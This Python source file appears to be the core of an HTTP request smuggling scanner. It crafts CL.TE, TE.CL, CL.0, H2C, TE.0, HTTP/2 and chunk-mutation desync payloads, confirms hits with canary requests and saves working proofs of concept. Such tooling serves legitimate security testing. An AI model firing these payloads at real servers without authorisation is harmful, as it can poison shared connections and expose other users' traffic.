"""Core differential desync scanner with multi-vector detection."""

from dataclasses import dataclass
from os import makedirs
from os.path import dirname, join, realpath
from time import monotonic, sleep
from typing import Dict, List, Optional, Set, Tuple

from lib.colors import Colors
from lib.http_client import HTTPClient, RECV_DATA, RECV_TIMEOUT
from lib.payloads import END_CHUNK, Payload
from lib.ui import (clear_progress, filter_response, print_finding,
                    print_info, print_progress, strip_ansi)
from lib.canary_probes import CanaryProbe
from lib.timing_detector import TimingDetector
from lib.connection_analyzer import ConnectionAnalyzer
from lib.h2c_probes import H2CProbe
from lib.te0_probes import TEZeroProbe
from lib.parser_discrepancy import ParserDiscrepancyEngine
from lib.single_packet import SinglePacketAttack
from lib.funky_chunks import funky_chunk_mutations, build_funky_payload
from lib.canary import CanaryGenerator
from lib.output_formatter import OutputFormatter


RESPONSE_OK = 0
RESPONSE_TIMEOUT = 1
RESPONSE_DISCONNECTED = 2
RESPONSE_ERROR = -1

FINDING_CATEGORIES = {
    "CL.0": "cl0",
    "0.CL": "cl0",
    "SINGLE_PACKET_CL0": "cl0",
    "SINGLE_PACKET": "single_packet",
    "TE.CL": "tecl",
    "CL.TE": "clte",
    "TECL": "tecl",
    "CLTE": "clte",
    "H2C_UPGRADE": "h2c",
    "H2C_SMUGGLE": "h2c",
    "TE.0_IGNORE": "te0",
    "TE.0_CASE": "te0",
    "H2.CL": "h2",
    "H2.TE": "h2",
    "H2.CRLF": "h2",
    "PARSER_DISCREPANCY": "parser",
    "FUNKY_CHUNK": "funky",
    "CONNECTION_LOCKED": "connection_locked",
    "CL.TE_TIMING": "timing",
    "TE.CL_TIMING": "timing",
}


def _has_te_header(template: str) -> bool:
    lower = template.lower().replace("_", "-").replace(" ", "")
    return "transfer-encoding" in lower


def _has_cl_header(template: str) -> bool:
    lower = template.lower().replace("_", "-").replace(" ", "")
    return "content-length" in lower


@dataclass
class ScanConfig:
    host: str
    port: int
    endpoint: str
    method: str
    vhost: str
    use_tls: bool
    timeout: float
    quiet: bool = False
    verbose: bool = False
    exit_early: bool = False
    rate_limit: float = 0.0
    log_handle: Optional[object] = None
    json_output: bool = False
    test_canary: bool = True
    test_cl0: bool = True
    test_single_packet: bool = True
    test_parser: bool = True
    test_funky: bool = True
    test_timing: bool = True
    test_h2c: bool = True
    test_te0: bool = True
    test_h2: bool = True
    test_mutations: bool = False


class SmugglerScanner:
    def __init__(self, config: ScanConfig) -> None:
        self.config = config
        self.cookies: List[str] = []
        self._last_probe_at = 0.0
        self._seen_findings: Set[str] = set()
        self.canary = CanaryGenerator()
        self.formatter = OutputFormatter(
            target=f"{config.host}:{config.port}{config.endpoint}",
            config="",
            method=config.method,
        )

    def _apply_rate_limit(self) -> None:
        if self.config.rate_limit <= 0:
            return
        elapsed = monotonic() - self._last_probe_at
        remaining = self.config.rate_limit - elapsed
        if remaining > 0:
            sleep(remaining)
        self._last_probe_at = monotonic()

    def _build_payload(self, template: str, content_length: int, body: str) -> Payload:
        host_value = self.config.vhost or self.config.host
        lines = [
            "__METHOD__ __ENDPOINT__?cb=__RANDOM__ HTTP/1.1",
            template,
            f"Host: {host_value}",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
        ]
        if self.cookies:
            lines.append("Cookie: " + " ".join(self.cookies))
        header = "\r\n".join(lines) + "\r\n"
        if not _has_cl_header(template):
            header += "Content-Length: __REPLACE_CL__\r\n"
        return Payload(
            host=host_value, method=self.config.method,
            endpoint=self.config.endpoint, header=header,
            body=body, content_length=content_length,
        )

    def _send(self, payload: Payload) -> Tuple[int, Optional[bytes], Payload, float]:
        self._apply_rate_limit()
        started = monotonic()
        client = HTTPClient(
            host=self.config.host, port=self.config.port,
            use_tls=self.config.use_tls, timeout=self.config.timeout,
        )
        status = RESPONSE_ERROR
        data: Optional[bytes] = None
        try:
            client.connect()
            client.send(payload.render())
            recv_status, data = client.receive()
            if recv_status == RECV_DATA:
                status = RESPONSE_OK
            elif recv_status == RECV_TIMEOUT:
                status = RESPONSE_TIMEOUT
            else:
                status = RESPONSE_DISCONNECTED
        except OSError:
            status = RESPONSE_ERROR
        finally:
            client.close()
        return status, data, payload, monotonic() - started

    def prepare(self) -> bool:
        probe = Payload(
            host=self.config.host, method="GET",
            endpoint=self.config.endpoint,
            header=(
                "__METHOD__ __ENDPOINT__?cb=__RANDOM__ HTTP/1.1\r\n"
                "Host: __HOST__\r\n"
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n"
                "Content-Length: __REPLACE_CL__\r\n"
            ),
            content_length=0,
        )
        status, data, _, _ = self._send(probe)
        if status != RESPONSE_OK:
            print_info("!", "target unreachable", self.config.log_handle, Colors.RED)
            return False
        if data:
            for line in filter_response(data).split("\r\n"):
                if line.lower().startswith("set-cookie:"):
                    raw = line.split(":", 1)[1].strip()
                    cookie = raw.split(";", 1)[0].strip()
                    if cookie:
                        self.cookies.append(cookie + ";")
        return True

    def _detect_h2_support(self) -> bool:
        if not self.config.use_tls:
            return False
        client = HTTPClient(
            host=self.config.host, port=self.config.port,
            use_tls=True, timeout=self.config.timeout,
            alpn=["h2", "http/1.1"],
        )
        try:
            client.connect()
            negotiated = client.selected_alpn
            client.close()
            return negotiated == "h2"
        except OSError:
            return False

    def _run_canary_probes(self) -> List[Dict[str, object]]:
        probe = CanaryProbe(
            host=self.config.host, port=self.config.port,
            use_tls=self.config.use_tls, timeout=self.config.timeout,
        )
        host_header = self.config.vhost or self.config.host
        return probe.run_all(self.config.endpoint, host_header,
                             include_cl0=self.config.test_cl0)

    def _run_timing_probes(self) -> List[Dict[str, object]]:
        detector = TimingDetector(
            host=self.config.host, port=self.config.port,
            use_tls=self.config.use_tls, timeout=self.config.timeout,
        )
        host_header = self.config.vhost or self.config.host
        return detector.run_all(self.config.endpoint, host_header)

    def _run_connection_analysis(self) -> List[Dict[str, object]]:
        analyzer = ConnectionAnalyzer(
            host=self.config.host, port=self.config.port,
            use_tls=self.config.use_tls, timeout=self.config.timeout,
        )
        host_header = self.config.vhost or self.config.host
        canary = self.canary.new_path()
        smuggled = (
            f"GET {canary} HTTP/1.1\r\n"
            f"Host: {host_header}\r\n\r\n"
        )
        payload_a = (
            f"POST {self.config.endpoint} HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            f"Content-Length: 0\r\n"
            f"\r\n"
            f"{smuggled}"
        ).encode("latin-1")
        victim = (
            f"GET {self.config.endpoint}?victim=1 HTTP/1.1\r\n"
            f"Host: {host_header}\r\n\r\n"
        ).encode("latin-1")
        result = analyzer.analyze(payload_a, victim)
        result["canary_path"] = canary
        result["raw"] = payload_a
        return [result]

    def _run_h2c_probes(self) -> List[Dict[str, object]]:
        probe = H2CProbe(
            host=self.config.host, port=self.config.port,
            use_tls=self.config.use_tls, timeout=self.config.timeout,
        )
        host_header = self.config.vhost or self.config.host
        return probe.run_all(self.config.endpoint, host_header)

    def _run_te0_probes(self) -> List[Dict[str, object]]:
        probe = TEZeroProbe(
            host=self.config.host, port=self.config.port,
            use_tls=self.config.use_tls, timeout=self.config.timeout,
        )
        host_header = self.config.vhost or self.config.host
        return probe.run_all(self.config.endpoint, host_header)

    def _run_h2_probes(self) -> List[Dict[str, object]]:
        from lib.h2_probes import H2DesyncProbe
        probe = H2DesyncProbe(
            host=self.config.host, port=self.config.port,
            use_tls=self.config.use_tls, timeout=self.config.timeout,
        )
        host_header = self.config.vhost or self.config.host
        return probe.run_all(self.config.endpoint, host_header)

    def _run_parser_probes(self) -> List[Dict[str, object]]:
        engine = ParserDiscrepancyEngine(
            host=self.config.host, port=self.config.port,
            use_tls=self.config.use_tls, timeout=self.config.timeout,
        )
        host_header = self.config.vhost or self.config.host
        return engine.run_all(self.config.endpoint, host_header)

    def _run_single_packet_probes(self) -> List[Dict[str, object]]:
        attack = SinglePacketAttack(
            host=self.config.host, port=self.config.port,
            use_tls=self.config.use_tls, timeout=self.config.timeout,
        )
        host_header = self.config.vhost or self.config.host
        return attack.run_all(self.config.endpoint, host_header)

    def _run_funky_chunks(self) -> List[Dict[str, object]]:
        mutations = funky_chunk_mutations()
        host_header = self.config.vhost or self.config.host
        results = []
        total = len(mutations)
        for idx, (name, mutation) in enumerate(mutations.items(), 1):
            canary_path = self.canary.new_path()
            raw = build_funky_payload(mutation, self.config.endpoint,
                                      host_header, canary_path)
            status = -1
            hit = False
            try:
                self._apply_rate_limit()
                client = HTTPClient(
                    host=self.config.host, port=self.config.port,
                    use_tls=self.config.use_tls, timeout=self.config.timeout,
                )
                client.connect()
                client.send(raw)
                status, data = client.receive_full()
                client.close()
                hit = self.canary.validate(data, canary_path)
            except OSError:
                pass
            if self.config.verbose:
                print_progress(idx, total, name,
                               "VULN" if hit else "clean",
                               Colors.RED if hit else Colors.GREEN)
            results.append({"name": name, "canary_path": canary_path,
                            "vulnerable": hit, "status": status, "raw": raw})
        clear_progress()
        return results

    def scan(self, mutations: Dict[str, str]) -> int:
        findings = 0

        h2_supported = self._detect_h2_support()
        if h2_supported and self.config.verbose:
            print_info("h2", "HTTP/2 negotiated via ALPN",
                       self.config.log_handle, Colors.CYAN)

        if self.config.test_canary:
            if self.config.verbose:
                print_info("canary", "running canary probes",
                           self.config.log_handle, Colors.MAGENTA)
            for result in self._run_canary_probes():
                if result.get("desync_suspected"):
                    if self._report_finding(
                            result.get("type", "CANARY"),
                            result.get("canary_path", "unknown"),
                            raw_payload=result.get("raw"),
                            canary_path=result.get("canary_path", ""),
                            confidence=result.get("confidence", 0.0)):
                        findings += 1
                        if self.config.exit_early:
                            return findings

        if self.config.test_timing:
            if self.config.verbose:
                print_info("timing", "running timing probes",
                           self.config.log_handle, Colors.MAGENTA)
            for result in self._run_timing_probes():
                if result.get("desync_suspected"):
                    attempts = result.get("attempts", 1) or 1
                    stalls = result.get("stalls", 0)
                    self._report_finding(
                        result.get("type", "TIMING"),
                        "timing_desync",
                        raw_payload=result.get("raw"),
                        confidence=stalls / attempts,
                        heuristic=True,
                    )

        if self.config.verbose:
            print_info("conn", "analyzing connection reuse",
                       self.config.log_handle, Colors.MAGENTA)
        for result in self._run_connection_analysis():
            if result.get("is_connection_locked"):
                self._report_finding("CONNECTION_LOCKED",
                                     "connection_locked_desync",
                                     raw_payload=result.get("raw"),
                                     canary_path=result.get("canary_path", ""),
                                     confidence=0.5,
                                     heuristic=True)

        if self.config.test_h2c:
            if self.config.verbose:
                print_info("h2c", "running H2C probes",
                           self.config.log_handle, Colors.MAGENTA)
            for result in self._run_h2c_probes():
                if result.get("desync_suspected"):
                    if self._report_finding(
                            result.get("type", "H2C"), "h2c_upgrade",
                            raw_payload=result.get("raw"),
                            canary_path=result.get("canary_path", ""),
                            confidence=1.0):
                        findings += 1
                        if self.config.exit_early:
                            return findings

        if self.config.test_te0:
            if self.config.verbose:
                print_info("te0", "running TE.0 probes",
                           self.config.log_handle, Colors.MAGENTA)
            for result in self._run_te0_probes():
                if result.get("desync_suspected"):
                    if self._report_finding(
                            result.get("type", "TE.0"), "te0_ignore",
                            raw_payload=result.get("raw"),
                            canary_path=result.get("canary_path", ""),
                            confidence=1.0):
                        findings += 1
                        if self.config.exit_early:
                            return findings

        if h2_supported and self.config.test_h2:
            if self.config.verbose:
                print_info("h2", "running HTTP/2 probes",
                           self.config.log_handle, Colors.MAGENTA)
            for result in self._run_h2_probes():
                if result.get("desync_suspected"):
                    if self._report_finding(
                            result.get("type", "H2"), "h2_downgrade",
                            raw_payload=result.get("raw"),
                            canary_path=result.get("canary_path", ""),
                            confidence=1.0):
                        findings += 1
                        if self.config.exit_early:
                            return findings

        if self.config.test_single_packet:
            if self.config.verbose:
                print_info("sp", "running single-packet probes",
                           self.config.log_handle, Colors.MAGENTA)
            for result in self._run_single_packet_probes():
                if result.get("desync_suspected"):
                    if self._report_finding(
                            result.get("type", "SINGLE_PACKET"),
                            "pipeline_desync",
                            raw_payload=result.get("raw"),
                            canary_path=result.get("canary_path", ""),
                            confidence=1.0):
                        findings += 1
                        if self.config.exit_early:
                            return findings

        if self.config.test_parser:
            if self.config.verbose:
                print_info("pd", "running parser discrepancy probes",
                           self.config.log_handle, Colors.MAGENTA)
            for result in self._run_parser_probes():
                if result.get("discrepancy"):
                    if self._report_finding(
                            "PARSER_DISCREPANCY",
                            result.get("type", "unknown"),
                            raw_payload=result.get("raw"),
                            canary_path=result.get("canary_path", ""),
                            confidence=1.0):
                        findings += 1
                        if self.config.exit_early:
                            return findings

        if self.config.test_funky:
            if self.config.verbose:
                print_info("funky", "running funky chunk probes",
                           self.config.log_handle, Colors.MAGENTA)
            for result in self._run_funky_chunks():
                if result.get("vulnerable"):
                    if self._report_finding(
                            "FUNKY_CHUNK", result.get("name", "unknown"),
                            raw_payload=result.get("raw"),
                            canary_path=result.get("canary_path", ""),
                            confidence=1.0):
                        findings += 1
                        if self.config.exit_early:
                            return findings

        if self.config.test_mutations:
            for name, template in mutations.items():
                if self._evaluate(name, template):
                    findings += 1
                    if self.config.exit_early:
                        break

        return findings

    def _evaluate(self, name: str, template: str) -> bool:
        has_te = _has_te_header(template)
        has_cl = _has_cl_header(template)
        if not has_te and not has_cl:
            return False
        kinds = ["CLTE", "TECL"] if has_te else ["CLTE"]
        for kind in kinds:
            payload = self._detect_pattern(template, kind)
            if payload is not None:
                return self._report_finding(kind, name, payload=payload)
        return False

    def _detect_pattern(self, template: str, kind: str) -> Optional[Payload]:
        canary_path = self.canary.new_path()
        host_header = self.config.vhost or self.config.host
        smuggled = (
            f"GET {canary_path} HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            f"\r\n"
        )
        if kind == "CLTE":
            body = END_CHUNK + smuggled
            content_length = len(body.encode("latin-1"))
        else:
            body = f"{len(smuggled):x}\r\n{smuggled}0\r\n\r\n"
            content_length = 4
        payload = self._build_payload(template, content_length, body)

        hits = 0
        attempts = 3
        for _ in range(attempts):
            self._apply_rate_limit()
            client = HTTPClient(
                host=self.config.host, port=self.config.port,
                use_tls=self.config.use_tls, timeout=self.config.timeout,
            )
            try:
                client.connect()
                client.send(payload.render())
                client.receive_full()
                victim = (
                    f"GET {self.config.endpoint}?victim=1 HTTP/1.1\r\n"
                    f"Host: {host_header}\r\n"
                    f"\r\n"
                ).encode("latin-1")
                client.send(victim)
                _, victim_data = client.receive_full()
                if self.canary.validate(victim_data, canary_path):
                    hits += 1
            except OSError:
                pass
            finally:
                client.close()
        if hits >= 2:
            return payload
        return None

    def _report_finding(self, kind: str, name: str, payload: Optional[Payload] = None,
                        raw_payload: Optional[bytes] = None,
                        canary_path: str = "", confidence: float = 0.0,
                        heuristic: bool = False) -> bool:
        category = FINDING_CATEGORIES.get(kind, kind.lower())
        if category in self._seen_findings:
            return False
        scheme = "https" if self.config.use_tls else "http"
        target = f"{scheme}://{self.config.host}:{self.config.port}{self.config.endpoint}"
        print_finding(kind, name, target, confidence, heuristic,
                      self.config.log_handle)
        self._seen_findings.add(category)
        if heuristic:
            return False
        raw: Optional[bytes] = None
        if payload is not None:
            raw = payload.render()
        elif raw_payload is not None:
            raw = raw_payload
        payload_str = raw.decode("latin-1", errors="replace") if raw else ""
        self.formatter.add_finding(kind, name, payload_str, target,
                                   canary_path, confidence)
        if raw is not None:
            self._write_poc(kind, name, raw)
        return True

    def _write_poc(self, kind: str, name: str, raw: bytes) -> None:
        base = realpath(dirname(__file__) + "/..")
        out_dir = join(base, "payloads")
        makedirs(out_dir, exist_ok=True)
        host_tag = self.config.host.replace(".", "_").replace(":", "_")
        port_tag = str(self.config.port)
        scheme = "https" if self.config.use_tls else "http"
        safe_kind = kind.replace(".", "_").replace("/", "_").replace("\\", "_")
        safe_name = "".join(c if c.isalnum() or c in "-_." else "_" for c in name)
        filename = join(out_dir,
                        f"{scheme}_{host_tag}_{port_tag}_{safe_kind}_{safe_name}.txt")
        try:
            with open(filename, "wb") as handle:
                handle.write(raw)
            if self.config.verbose:
                print_info("poc", filename, self.config.log_handle, Colors.CYAN)
        except OSError:
            pass

    def export_json(self) -> str:
        return self.formatter.to_json()

    def export_csv(self) -> str:
        return self.formatter.to_csv()

    def get_findings(self) -> List[Dict[str, object]]:
        return self.formatter.findings